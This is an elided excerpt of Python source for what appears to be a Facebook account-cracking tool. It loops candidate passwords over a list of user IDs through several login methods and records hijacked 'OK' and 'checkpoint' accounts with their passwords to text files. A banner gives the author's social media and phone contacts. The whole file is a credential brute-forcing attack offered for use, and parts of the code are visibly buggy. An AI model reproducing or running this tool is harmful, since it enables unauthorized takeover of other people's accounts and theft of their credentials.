...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#BITUL_VAU('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		try:
			...
			print (' [*]=============================================')
			self.id = BITUL(self.apk).read().splitlines()
			BITUL_VAU(' [*] Total ID : %s'%(len(self.id)))
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							BITUL_VAU('[•] Result CP saved to CP.txt')
							BITUL_VAU('\n\tCrack Processing...\n')
							BITUL_VAU('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					BITUL_VAU('\n01.) Metode b-api ')
					BITUL_VAU('02.) Metode mbasic ')
					BITUL_VAU('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			BITUL_VAU('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			BITUL_VAU(' [1] BITUL Method 1 ')
			BITUL_VAU(' [2] BITUL Method 2  [ Pro ]')
			BITUL_VAU(' [3] BITUL Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [BITUL] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if "access_token" in p:
				...
				try:
					...
					BITUL_VAU('\r\033[1;91m[Checkpoint-AKING] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				BITUL_VAU('\r\033[1;91m[Checkpoint-BITUL] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				BITUL_VAU('\r\033[1;92m[Successful-BITUL] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
...
\_______/ \______|   \__|    \______/ \________|
 ...
 [*]=============================================
    Author   : BITUL VAU
    Facebook : https://facebook.com/useless3490
    Github : https://github.com/bitulvau
    Whats App  : 01903624823
 [*]=============================================
...
def dupcutter():
	os.system("xdg-open https://wa.me/+8801903624823")
	time.sleep(3)
	readline___Public_Xml()
def sep():
	logo()
	os.system("xdg-open https://facebook.com/useless3490")
	time.sleep(3)
	readline___Public_Xml()
